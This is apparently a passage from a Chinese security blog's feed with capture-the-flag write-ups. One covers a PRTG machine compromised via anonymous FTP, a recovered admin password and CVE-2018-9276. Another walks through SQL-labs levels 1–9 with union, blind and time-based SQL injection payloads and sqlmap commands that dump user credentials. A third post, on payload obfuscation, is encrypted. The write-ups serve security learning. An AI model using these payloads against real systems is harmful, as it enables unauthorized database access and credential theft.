title="入侵"></a>入侵</h1><h2 id="ftp-匿名登录"><a href="#ftp-匿名登录" class="headerlink" title="ftp 匿名登录"></a>ftp 匿名登录</h2><p>可以登录上去，不过权限较低，无法上传文件</p><p>发现iis的网站目录 inetpub&#x2F;<br><img src="/Rxi134_FILE/3272a46bd945fac2bed958620dffec43_MD5.jpeg"></p><p>但是进去发现什么都没有？</p><p>倒是可以把&#x2F;Public下的flag下载下来</p><h2 id="回到网站-PRTG-monitor"><a href="#回到网站-PRTG-monitor" class="headerlink" title="回到网站 PRTG monitor"></a>回到网站 PRTG monitor</h2><p>我突然发现nmap对80端口是扫出来版本号的，PRTG&#x2F;18.1.37.13946</p><p>PRTG 是什么？<br><img src="/Rxi134_FILE/a4224f0187057f1e609e4322a757082f_MD5.jpeg"></p><p>查查有没有nday<br><img src="/Rxi134_FILE/c7a001f64a58634856264d1fdbaab954_MD5.jpeg"></p><p>还真有，但是需要先身份认证进去</p><h2 id="尝试弱口令登录"><a href="#尝试弱口令登录" class="headerlink" title="尝试弱口令登录"></a>尝试弱口令登录</h2><p>查下默认密码<br><img src="/Rxi134_FILE/966a2f54d47ada08c9a85905df3cc489_MD5.jpeg"></p><p>它有个忘记密码功能，对于非法用户名会报错，可以用来推测用户名<br><img src="/Rxi134_FILE/91f168d6ed9f6acf94bd118ef99cb6fb_MD5.jpeg"></p><p>测一下用户名 prtgadmin<br><img src="/Rxi134_FILE/503c57568057434426e139ab620b5fe1_MD5.jpeg"><br>哎，存在的<br><img src="/Rxi134_FILE/0f61055dbe7ef85a4e59af448b12b056_MD5.jpeg"></p><p>直接尝试 prtgadmin:prtgadmin，失败了…<br><img src="/Rxi134_FILE/1e58e187236f9a0b963ca947c265861c_MD5.jpeg"></p><p>爆破一波密码，p都没出来</p><h2 id="ftp翻找RPGT配置文件"><a href="#ftp翻找RPGT配置文件" class="headerlink" title="*ftp翻找RPGT配置文件"></a>*ftp翻找RPGT配置文件</h2><p>直接把整个目录给下载下来</p><p>可以用wget 下载文件夹，不过我还是喜欢用xshell可视化</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">wget</span> <span class="token parameter variable">-r</span> ftp://anonymous:@10.10.10.152/<span class="token string">"Program Files (x86)"</span>/<span class="token string">"PRTG Network Monitor"</span>/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/Rxi134_FILE/adc2575bb0673605c0e02f79b76fe262_MD5.jpeg"></p><p>但是找半天啥都没找到。。。</p><p>查看wp，数据文件在<code>%programdata%\Paessler\PRTG Network Monitor</code>下<br><img src="/Rxi134_FILE/ef3aff51f8d1619c32680b8460a3e8ab_MD5.jpeg"><br>但是我没看到ProgramData&#x2F;目录啊？<br><img src="/Rxi134_FILE/cc5434b9176c1bbfa89938c8af097835_MD5.jpeg"></p><p>可以转入？！<br><img src="/Rxi134_FILE/bfee3dde4b27c7311a002c2db8fdeaa6_MD5.jpeg"></p><blockquote><p>隐藏受保护的系统文件：当你启用 “隐藏受保护的操作系统文件” 功能时，Windows 会隐藏一部分敏感的系统文件，防止这些文件被普通用户（或管理员）误操作。这通常是为了保护系统的完整性，确保操作系统和应用程序可以正常运行。即使这些文件被显示出来，Windows 仍然会阻止用户进行修改或删除。<br>常见的文件夹有 ProgramData&#x2F;、bootmgr&#x2F;、</p></blockquote><p>看到了一堆文件，先看.bak备份文件</p><p><img src="/Rxi134_FILE/de738317967f0ff86b9413fb9c3bc30e_MD5.jpeg"></p><p>找到一串密码！</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">prtgadmin:PrTg@dmin2018<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/Rxi134_FILE/d7faef30f52f8de2f0bde4b611bf35e7_MD5.jpeg"></p><p>啊？<br><img src="/Rxi134_FILE/ffbc80abb3266f25014109ddeef701c4_MD5.jpeg"></p><p>wp说根据不同的年份，可以联想到密码可能只是改成了2019</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">prtgadmin:PrTg@dmin2019<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/Rxi134_FILE/e1b98961b9ea506f3f35598f98d772b6_MD5.jpeg"></p><p>登陆成功<br><img src="/Rxi134_FILE/caae998d3b07fa81adfa2e221fe9151a_MD5.jpeg"></p><h2 id="CVE-2018-9276-Authenticated-Command-Injection"><a href="#CVE-2018-9276-Authenticated-Command-Injection" class="headerlink" title="CVE-2018-9276 Authenticated Command Injection"></a>CVE-2018-9276 Authenticated Command Injection</h2><p>msf可以直接打<br><img src="/Rxi134_FILE/87d17bcc221c6d41e1129a0be60bcbec_MD5.jpeg"></p><p><img src="/Rxi134_FILE/4dc9b688f7b550dc11671653aca639c4_MD5.jpeg"></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>总的来说，我并不觉得这个机器非常简单，特别是找密码部分改年份的部分，有点脑洞</p>]]></content>
      
      
      <categories>
          
          <category> pentest </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL-labs靶场通关</title>
      <link href="/2024/12/28/sql-labs%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/"/>
      <url>/2024/12/28/sql-labs%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/</url>
      
        <content type="html"><![CDATA[<blockquote><p>靶场地址：<a href="https://buuoj.cn/challenges#sqli-labs">BUUCTF在线评测</a></p></blockquote><h1 id="level-1"><a href="#level-1" class="headerlink" title="level 1"></a>level 1</h1><p>GET传参 ?id&#x3D;1<br><img src="/SNIPER_FILE/bf52f20479948ae3c94db8829592eb73_MD5.jpeg"></p><p>传参2回显不同，说明传入的参数是会进入数据库语句的</p><p><code>1&#39;</code> 单引号报错，这里有报错注入<br><img src="/SNIPER_FILE/0af604d9a444e02be20bb5d7b50ff5f8_MD5.jpeg"></p><p><code>1&#39;--+</code><br><img src="/SNIPER_FILE/ad4c34712b16f5da90aff0ecddc85a14_MD5.jpeg"></p><p>可以判断出是字符型且存在SQL注入</p><p>联合查询爆出列数，3列能正常回显</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">1'UNION SELECT 1,2,3--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/SNIPER_FILE/1eb747fd3e620bdbb4ebbf430520d4cf_MD5.jpeg"></p><p>确定回显位<br><img src="/SNIPER_FILE/7b05974a10e1da5c1879c7ed8bbbd552_MD5.jpeg"></p><p>爆库，库名为 security </p><pre class="line-numbers language-text" data-language="text"><code class="language-text">-1'UNION SELECT 1,2,database()--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>爆表，库中有表 emails, referers, uagents, users</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">-1'UNION SELECT 1,2,group_concat(table_name) from information_schema.tables where table_schema='security'--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>爆users表的字段</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">-1'UNION SELECT 1,2,group_concat(column_name) from information_schema.columns where table_name='users'--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/SNIPER_FILE/ba80e76bac98f19e3e11052afe732797_MD5.jpeg"></p><p>爆 username 和 password 列的数据</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">-1'UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '&lt;br>') from users--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/SNIPER_FILE/6ef05546d1710f6aea02326ac0b8ddd5_MD5.jpeg"></p><h1 id="level-2"><a href="#level-2" class="headerlink" title="level 2"></a>level 2</h1><p>还是GET传参，id?&#x3D;1</p><p><code>1&#39;</code>单引号报错<br><img src="/SNIPER_FILE/629cd3175a7a2ec059bf1ff3b1fdb4ec_MD5.jpeg"></p><p><code>1&#39;--+</code>还是报错，看来是字符型<br><img src="/SNIPER_FILE/7abe3f752d68c1e9e4ac58549624bae9_MD5.jpeg"></p><p>然后跟level1一样了，把单引号去了就行<br><img src="/SNIPER_FILE/bb3bb333377d3af4f7dfec592006b912_MD5.jpeg"></p><h1 id="level-3"><a href="#level-3" class="headerlink" title="level 3"></a>level 3</h1><p>单引号报错，注释后面的也报错，是字符型，但是这里的报错要注意</p><p><img src="/SNIPER_FILE/e5d773c3740dbff66a88890c15ec3dfe_MD5.jpeg"></p><p>所以我们需要将括号闭合</p><p>爆列数：</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">id=-1') union select 1,2,3 --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/SNIPER_FILE/44635ec4a33ed787d8cfb0ae2adb3657_MD5.jpeg"></p><p>然后就是跟前面一样<br><img src="/SNIPER_FILE/114819b199c72e6933feb74b5553bc17_MD5.jpeg"></p><h1 id="level-4"><a href="#level-4" class="headerlink" title="level 4"></a>level 4</h1><p>单引号没反应，双引号报错了，双引号的字符型<br><img src="/SNIPER_FILE/964a833c2c6d791c5ea5cba77438acdd_MD5.jpeg"></p><p>注意括号闭合，跟level3一样<br><img src="/SNIPER_FILE/7ab66e7d9a58913596eb76f7d2ed6b15_MD5.jpeg"></p><p>爆库</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">-1") union select 1,2,database()--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>爆字段</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">-1") UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '&lt;br>') from users--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="level-5"><a href="#level-5" class="headerlink" title="level 5"></a>level 5</h1><p>id&#x3D;1，回显了一个 “You are in”<br><img src="/SNIPER_FILE/2056d2fe10bbf187f0108da429847a99_MD5.jpeg"></p><p>单引号报错<br><img src="/SNIPER_FILE/54ae93969a70a1a642189e336a6dda0d_MD5.jpeg"></p><p>是字符型<br><img src="/SNIPER_FILE/e680cadad695f0424ad2531e6153ce7d_MD5.jpeg"></p><p>爆列数，是三列：</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">id=1' union select 1,2,3--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/SNIPER_FILE/7df21af07b6ff5f2b32d87c9deab9bda_MD5.jpeg"></p><p>只有“You are in”来判断是否成功，bool盲注</p><ul><li>爆库：<br>先测库名长度，最终测出来8位时有回显<pre class="line-numbers language-text" data-language="text"><code class="language-text">1' and length(database())=8 --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/SNIPER_FILE/6b32306fa6ddf4c723ff7668c75ce814_MD5.jpeg"></li></ul><p>然后测库名，先测第一个字符，测出为 ‘s’</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">1' and ascii(substr(database(),1,1))=115 --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/SNIPER_FILE/74e9368bbfcd6de2da35d01d3260ec3e_MD5.jpeg"></p><p>测出了注入点，sqlmap直接梭即可</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python sqlmap.py <span class="token parameter variable">-u</span> http://7796490a-d8c6-4484-a4f4-93f46c2e3466.node5.buuoj.cn/Less-5?id<span class="token operator">=</span><span class="token number">1</span> <span class="token parameter variable">-p</span> <span class="token string">'id'</span> <span class="token parameter variable">--technique</span> B --current-db <span class="token parameter variable">--batch</span> <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/SNIPER_FILE/f334bf44aa25e575e5f5b197c8c300f0_MD5.jpeg"></p><ul><li><p>爆表</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python sqlmap.py <span class="token parameter variable">-u</span> http://7796490a-d8c6-4484-a4f4-93f46c2e3466.node5.buuoj.cn/Less-5?id<span class="token operator">=</span><span class="token number">1</span> <span class="token parameter variable">-p</span> <span class="token string">'id'</span> <span class="token parameter variable">--technique</span> B <span class="token parameter variable">-D</span> <span class="token string">'security'</span> <span class="token parameter variable">--tables</span> <span class="token parameter variable">--batch</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/SNIPER_FILE/6f2eaf7b5b20201ebae3d8f20a5c967c_MD5.jpeg"></p></li><li><p>爆字段</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python sqlmap.py <span class="token parameter variable">-u</span> http://7796490a-d8c6-4484-a4f4-93f46c2e3466.node5.buuoj.cn/Less-5?id<span class="token operator">=</span><span class="token number">1</span> <span class="token parameter variable">-p</span> <span class="token string">'id'</span> <span class="token parameter variable">--technique</span> B <span class="token parameter variable">-D</span> <span class="token string">'security'</span> <span class="token parameter variable">-T</span> <span class="token string">'users'</span> <span class="token parameter variable">--columns</span> <span class="token parameter variable">--batch</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/SNIPER_FILE/fe88ba57b2cac20d91ecbb8bdf3207db_MD5.jpeg"></p></li><li><p>爆数据</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python sqlmap.py <span class="token parameter variable">-u</span> http://7796490a-d8c6-4484-a4f4-93f46c2e3466.node5.buuoj.cn/Less-5?id<span class="token operator">=</span><span class="token number">1</span> <span class="token parameter variable">-p</span> <span class="token string">'id'</span> <span class="token parameter variable">--technique</span> B <span class="token parameter variable">-D</span> <span class="token string">'security'</span> <span class="token parameter variable">-T</span> <span class="token string">'users'</span> <span class="token parameter variable">-C</span> <span class="token string">'username,password'</span> <span class="token parameter variable">--dump</span> <span class="token parameter variable">--batch</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul><h1 id="level-6"><a href="#level-6" class="headerlink" title="level 6"></a>level 6</h1><p>还是GET参数</p><p><code>1&#39;</code>单引号无反应，<code>1&quot;</code>双引号报错<br><img src="/SNIPER_FILE/a074dbb60681daab2c70772ff8eaafc6_MD5.jpeg"></p><p><code>1&quot;--+</code>不报错，看来是字符型</p><p>那就跟level5一样，只是把单引号换成双引号罢了</p><h1 id="level-7"><a href="#level-7" class="headerlink" title="*level 7"></a>*level 7</h1><p><code>?id=1</code>，这次输出不一样了<br><img src="/SNIPER_FILE/822b5a2aad57c06891092c9e3f8a2a38_MD5.jpeg"></p><p><code>1&#39;</code>单引号不再回显详细的错误信息，只提示语法有错误<br><img src="/SNIPER_FILE/fdf3fa4bcdc79579bfb20d03e3137d27_MD5.jpeg"></p><p><code>1&#39; --+</code> 还是报错</p><p><code>1&#39;&#39;</code>不报错了，id 应该是由单引号包裹的<br><img src="/SNIPER_FILE/dcc8577f74b559276161d9bd16cea6a6_MD5.jpeg"></p><p><code>1&#39;)--+</code>加个括号，还是报错</p><p><code>1&#39;))--+</code>双括号，不报错了！看来id是 <code>((&#39;id&#39;))</code> 包裹的<br><img src="/SNIPER_FILE/6db41c0f6345366db261c7c7573ae260_MD5.jpeg"></p><ul><li><p>测试注入点，成功正常返回，说明有3列</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">1')) union select 1,2,3--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/SNIPER_FILE/0a2c9f79dbf0531a0fa3eb68c54a6608_MD5.jpeg"></p></li><li><p>爆库<br>测试库名长度</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">1')) and length(database())=8--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul><p>后面的就跟level5一样了</p><h1 id="level-8"><a href="#level-8" class="headerlink" title="level 8"></a>level 8</h1><p>GET传参?id&#x3D;1<br><img src="/SNIPER_FILE/6ca284ff4431e10c997b860c7911a800_MD5.jpeg"></p><p><code>1&#39;</code>加个单引号，没回显了<br><img src="/SNIPER_FILE/840d6751977e36851724df91dcd1452c_MD5.jpeg"></p><p><code>1&#39; --+</code>回显成功<br><img src="/SNIPER_FILE/2a592df9d1d5da0d38ac10a95bcd3f8d_MD5.jpeg"></p><p>测试注入点，有三列</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">1' union select 1,2,3--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>后面的就跟level5一样了</p><h1 id="level-9"><a href="#level-9" class="headerlink" title="level 9"></a>level 9</h1><p>GET传参</p><p><code>1&#39;</code>单引号，没反应<br><code>1&quot;</code>双引号，没反应</p><p>可能是时间盲注，测一下</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">1' and if(1=2,1,sleep(5)) --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/SNIPER_FILE/ecba818f8ec4f46dbe4d85156950cce2_MD5.jpeg"><br>成功延迟</p><ul><li>爆库<br>测试库名称长度，长度为8时不延迟<pre class="line-numbers language-text" data-language="text"><code class="language-text">1' and if(length(database())=8,1,sleep(5)) --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul><p>测试库名的第一个字符，115即’s’时不延迟</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">1' and if(ascii(substr(database(),1,1))=115,1,sleep(5)) --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后就直接上sqlmap了，爆库名：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python sqlmap.py <span class="token parameter variable">-u</span> <span class="token string">'http://8014c573-16a1-446b-b671-54736ab76628.node5.buuoj.cn/Less-9?id=1'</span> <span class="token parameter variable">-p</span> <span class="token string">'id'</span> <span class="token parameter variable">--technique</span> T <span class="token parameter variable">-o</span> --current-db <span class="token parameter variable">--batch</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/SNIPER_FILE/d64997bbe7f46dadc52e3a26e14fff24_MD5.jpeg"></p><p>然后正常爆库爆表爆字段即可</p>]]></content>
      
      
      <categories>
          
          <category> pentest </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>21.Payload Obfuscation - IPv4 IPv6Fuscation 有效负载混淆-IPV4 IPV6</title>
      <link href="/2024/12/25/21.Payload%20Obfuscation%20-%20IPv4%20IPv6Fuscation%20%E6%9C%89%E6%95%88%E8%B4%9F%E8%BD%BD%E6%B7%B7%E6%B7%86-IPV4%20IPV6/"/>
      <url>/2024/12/25/21.Payload%20Obfuscation%20-%20IPv4%20IPv6Fuscation%20%E6%9C%89%E6%95%88%E8%B4%9F%E8%BD%BD%E6%B7%B7%E6%B7%86-IPV4%20IPV6/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="e340392a392c987bce0ac7b37c4e875c7dfa36691dd570d3a2af0984fb87a304">2239f6ef2369263b61ef594c41be1d81caaad9e00dfd39e2e6679848a71a75425b783f2084bbe71c207ed1c250fb2ed6cefc9a851b67880d7dd7f0b02318ccecec0a1f5749dc5908d23dee16a3508513fe37119411562cbbb5d634a272aff775f967e2bdd16c5cf8f9430294cb642a60a437cd8a313cb3d9703630a222f40aff573f3b143adf7a584b2c90d5001265a947322db4e1a3cc6ff5ec9acc681f64aa17a1fa6c2ef401378a8079cc651e98fb5298206095746fb414c894562271994fcf31b3a3e23cf6e915555641c6ffe2e1d9f410a71b901afa714a77ca507dd025eba677b656e2b5c8250914a2aa155dcdeb6ca49e775748171fc8356d1b2672b56b6c3456687bd8522263f00ddf25c1571e93bcd585ca23bb2d988447ce5ffc588020bc91b43bd4cf47c1e19e0822a32673c254946deba464f156ad6ee6daf4591367d52f99f9689f32e19cd71a099db5751dd260800bd8d294b5fe40cd5e1425a8821f4263972dacdeee800fbf309fe22b8e15eb64710ad908e31aa10c41b6fe05bdb638711ab8424f04a172de929c0af2e3375ffdd08523207a0f539c415d22c759ff0484c5eefc9218233fbb83f720aadfec9188093bc060dc6f77c65bf9eb8bce808f4943fd3a7819a67827314174cbb66683175072c21db068226d98e578583739301ccf8269f57f903980a5ab8b7daa431c2b52a27a7c6a80e26c8241ba06f407170217a8b12b65b975a6aa6ab1b746b7d712e72b480b26e8690eccc816eddaf9eabb45dce9aeb11890f1a6f3f0525373b51e5cbdc04fe91009cc63a70c10a8fe3ffa73720a39f01275ef96d63a7f7661209542c0f74eeaf6b39ffc09a2d967ede48d2645034ae439a9548ce54fda6ef923e7cee2b50e15f9ddb989006bd23f193d9cc7df0704c2cf9c8ef617336e359f173d37f929fc9df00d7f614541b1ce7e49c4732d8c3dfeab21eb796f19a49e8bdd3f9305df05ab2ea2658439d8942d2aacfec8ab8e6edc953efd354f45999f73ed2b97204ecb0d0be0986b7d0fb8733d683c39ff41b1f67c315cdcfe548bfecae3c52d62621ad881d2f6743e9f1f9f10db820b1f531d3cdd36cdb60550b0492638000cd3a8c7a0f4ec24d2d0dece348fe5f2ef2015359315d1802804f2e36f560aa7105a13c17434b66ec9463d34caf0d9691d3ca2b80bba7158e5b31c7b1fd423cb4b6d2f0f82c98a3485920b0ccf99accb712b04b2f5462108196cd9af30a59054331515861b3b51ce311877440610d3ff0ad9f4d6dd5d7b584600276ebd99af874f525d6524b71154399f07dcdeebe6cddb153c90f2f2ff07ec6eb663d6fd75cc27372e272c711bcd3ab0a838d8b539420f69ab96c0cab197bd00e9f9697c274d9944e4cce93667a0e6d55c63fbce25c03ae460c3ea1b2489951f4a0ef15093abf0a54227843083fed15007459d47ee74c46bcaab7163a7f2296e1e3389f42e528d37744746463bd10b18da031b75bbcaab284631a3c89e6fc6291470c5d9e119b09149c0fc1763e212f1fd0974caaf3601fbb7d3615fd87659d96a6f3f81a5c72548ae04801bf84a8b2c9ad09207eae5bfac2332d3602e4693ebb65892fe0e7ac10ce5605df91ff74cfb8cdc9f8241426df0b08ebeaa6c6ffb2adda06f7568b4e2c6234e777836e01cf162b781baf4f8af1b0dbfeff0d11b64a2d31d4a56974c4ddd1dda2724d917e9e708f61065e520cc479d3409eb0f19e0ca485a2917b16d53cf0c279aa13032678bcabc52123b53ab33d9e4b37653bf8f5a4fc5fee223b79b59f7b4a0227bd40f95de1d2911242566276ac7917438c8380c380937391d1f8641ba49c4475d697aa23b4297fef968b1626b6f12536e3f8f6418a362e8ae92f5d555a87a1f2ac755d2ece779f19e32030ba147cd50a2f803e682691dee2081cfb6307155e8f08c19326234bd57ce2be2683ccbe33b1ad8b8d8894941f0ddb939aed0a88e74d298fb2a2c04146d0f5d2de15922f8839bcbe16c7b84afd7aca8a68dcdeb3cacac392484acf5bac78adab7d3c0e08f9d92f7a47df85a4bee10f35068c297536f2f8d2c2757cb450eb86309f15a1bbd6a7e8b7d9d6de33b9471eb178bdf644d7ee439c6f050ba9551a616fcd132e3dbaa68408dba73c9a9442342e462b0239357ee8fb2b3253bca3f6b326f438bfa032efae711c5a049d9a83d0b835f113e388763b262a2fb10ebbaa194b7f531b01445647338b5a4b1492da9be49783d0b7270fe53e5203f5990c130a2ae6a635b4055f87c4b58afd70ec83f383f9aeed8aa015377e8645c543709a3b2ad7d6f6da0470f5253f53088f762ce1902530ac40ed6cc2714909b5910bea6e8abe8ed05a4e3756f2a74712dff551091344180d905716a6219a7f18cee454f2d135798fa460ff12916b4fb27ed9d298cee2b98e0445905c30b20c0f79ffdafb90df176223d8448edde60bea24abdc98d87d04516cb460ab1c5c199619d9e86423bad3316a03efe6592f64c86c16fb12829e83b8eaceec36970ce47125e18e3004512f03387c73e28a6981050d3277c599394ed5d0b2f6d2ccfb1e3b0bbe7f31ecb18e10fc9f7c8af6efb5795cd1c77b1422ea4fe5298311541818927426de9eb8149dce678a56ff3cfde603439c191f2869ddfd27dfe2f3da91ebdd385155a3be24ac880ffe45d8d37ade5f3e12975afba0d5e9fcf0bd85b4f0b7990e78ef5d5ec1d5e4ab4895a96c7870eb9cd2cfa876a53c67eb5ba13c7809fdf1b1123489ba5d216f944baf01d9ee9b9d02c62396bca042208c0aaf474270205da6761c6b9531e951c21acaf36bbf870e75c1a039ebb2bf78f17c4c3954a483bf2d3b001e60fc75f640ac2d21d77b114905e33dd02c30c84873444d66a802fd1418b229f8cce5595984bfe88db7e31ff9e22592f8cfbe6c9d4c88f2fd42d68ec0f2f93b5a9ffc1a5b3c145d7f094303a1067d105ec88afd565e616b5c74033ade20ee353341bca0963720743359d826503073a5a790ac6eb2474187b403462885289101677a2210f4d067687d0044801d654d56d826c3a277fcbd81d62d58267b298551c2deba3bb11e933f7a240d434e1e5a3d1891574859065a84382cd443d7a126897bc9e7597a55bfc84a4fbd9c91680be036c91d80f276fa4983f557f8038cd0349c2520a3fe6ab1c11101f5dc0ee2e7c72d67193b4c09ae2e399a2bb4df184e1800acbc7f8b8304174bae49f16e80deb1d6ed27648f1732bc2ba6cedffd600248c2d497ef399387a5f47cec68d0ec201ded6970ff283ed1e79c536f0d49914d8e2c6d5b6ed26a219c47c30d69e6b1be13d8824772d9eafb8b9c55a91fb3a93b55b8e6e00ee520daef747440c7211f3201895715612c758d6b000c80e3ffa0b199da779047bbd30ab665ca8cca7c37667992802b9cf9cc62a309a595d34b1c04651c59414e7b6db6e80f6ee1c1d855c3d0e106f782fb55c58388d04b20402f5226e58bf8b80ffdb6caaa7fb9823bcc5bc4c0fc873b2ec4ba82439b9021c8a4ab539caedddce3aa76b9c81dfa7588d0f7ba30cf75b677dd8581718d877459a8d18f6775b0ab148829cd632571dffd5159b32d18dbac6378f187f81c75a400ea1baae4c60f964344bdc21f304d38c7a5cba8f1bd0573424514652f1386b8347b965df9ff57e596b406d54b3f8e37b570420dce7e84278dfb88ae84c44fe4db06cb39d995c88b41d0c09d1ebd770b8767818a0a9172945402883a664822ba79f453b6fea7e357a44fa16368227291519bfa7c403121c5b367a89ab1b635b753c5bac47862b5291349de44fe70b810b07562f136c14e5d3abf930b9f6929a7033c47bd5e6192ec30d93c81690440d1657840c29325c7887ae5733b78b1447da86f8264494f24c228cf8dbd7ca0e6119d753dfacd422291bcfca2047e009e813eb41c6b1f4f7eb000600a1c8d20af336318112d373f7bbc417be1170b09934eee2bdd8392a5c2485c27e8ed47168357bdb9e19e850cd8b2c30284c7cffd08c42e3b78fa2433fd0345a94c1dd2476cb570320ca9c217d2a45193d82b561789a5c39e882d409e5345007981b6423ef2d317d866e5c32db4346b80886e868ed4f64d53e6b799bffbe88593a5b135225c4945f6dbbc3b2d0488b62278b0ba0fa4f92bf26a5b0b2b58f4b9d676e0baca311aa70cddc057fe36f229270a91289f78fd523119439ed0bea201c8442c4dd0c9fcd199d2dd21da51ab1f381794db9d365b61f762cd0b2c160fbad89fed21872aba954c76b2d4d53b5f104c99dc00437d07e9d6699a19f17b714e835c1db87fd8e94fee15057ea6bf635ec83c5432051393a4ed9a282abf81c7a187cb11209a55b802cc90698c45a2d6e596175f1ea503ce40de3db18ee5c2593a33ca3afb491d7708e71f1035b643d00d191acfdcb04ccd67e5a11e16e8b1cf26f41355e2ab94a58e257651444f2445b8268a6f2bfbb63ac1ea19d8185de0c430bccf8c4afc21983027d75afa9d29eb7dbcbdc30f835826be2284875bd44a62b3f76ee8b35deb3f3013efb4c3c00052260017946060c47794e91887b0532119f4c94a36ad52d28c77896bb857cde6d17210e61fbcf2e1a4551e6bd9d64ea785d166f91637c0b010552154339d6241544f7f19f6f8841575978264ea6c03672200660857d00abe1637994927adeb4e3b3e65c551584f1c53a7ab22f636b2f58045912a5f8a38c65cc7fd20dacab72cbb172cac6c3d590fdcc4c28f8abe027f95db686188643a6a9f766bfe07df84e10ccf87d4bf6478a05c86f4737f6d93f14d03aee59bc4635b59cba0ee9028cf2c95cfa55157a1f507b6685b5f4bc735a2baf3c04b61102223d42e5a28de83b5987b50fc896bcdb67241a53391df916f5ade59ee27115608a2d4b7d984bce3cd240e84b90e79719a4072ac91c4081ff0b6b137e511f41d9eade705d2ef5a1f5737ef47bf178d81dfd00f56b9ab1672d881b4da49d8dd23d8a17abf0e7cd869531df9bc1e6d89abd1b3d7b1372d957aba86eb55400a350221c968203ea5df7ba8833ffdb8474018bb12ca23b233e7602d11a1644077132b9fe9f09808faba25e842c3bf035707ed59e7340a0f85697bb516174e1c74b746d8f5b9a4453b37f65062efba4b86ec7101833d50bcd5805bd7c2e0c18edb3b68fe42c64f6a315d3c301aa0f61e3f832f7f4dcabbad80716d57906603f51c997023882f879495946f7263fb4273b3a97f6de4a3e47d4d87df48fb8ac198e921d511f1cfea28a57f44811a8b0332dc116072547ef555777d14813f7b72a19e05d0cde596c11f66f7f47a568b97ec2fb5eb6cd619f8264a8e872700c48ef9817036e46f040db930ee72cf72d3cc679d2bcfc1a0af71e94b263a5b36574ae3817df5c3ad0f766334dc098995d913befa2722db6a98d2c7b9787e30a4e783f2fa2773ebd695c17d5f894d82949eed52fc2b73655764e65d71e2b0540b4761523e62d99cac65086380ba406bf293513dce0a95deb906d04298986deada588b3cae6bcadf554cf9ca3ee6fe55e91d4acaf0346e8d9a5d555a74975a3991387aec7da23be59dffc45863a80cb7ed3aacf380ff62f983b9443c6e85e1045c12438d3b6e30b6976d1575f3fba1bf597726227931957e62c0ae0254a7717dc57becd8191d4f5dfe1cfadadf884a7e63c213053bf1ac40f2a440cda457e49396514c67e1dfd38deda0ed60fb85cbdc0ba673fa2ea369dfd0010099dff8b784060ca696f5117a6ebd72f8a7304c3d75f0d26674fc9e450837a27971b6b5473b2f0b319ebc0a7344a778248ce96f4071ab34d40816e58d833e2442253963bd6739535c1abfd14874081de54fd2d8b1835cc91fb9b1db605efb52f71d3ad3bafe6c91c17667951cb81d00dcfb642b5f52db83dd2a853003b3a35b016ad01ea19f8b80a0c945b8c6925972840ae90d551a13f1e5953d310a1faa4422ed2252f0b0065ed0b0489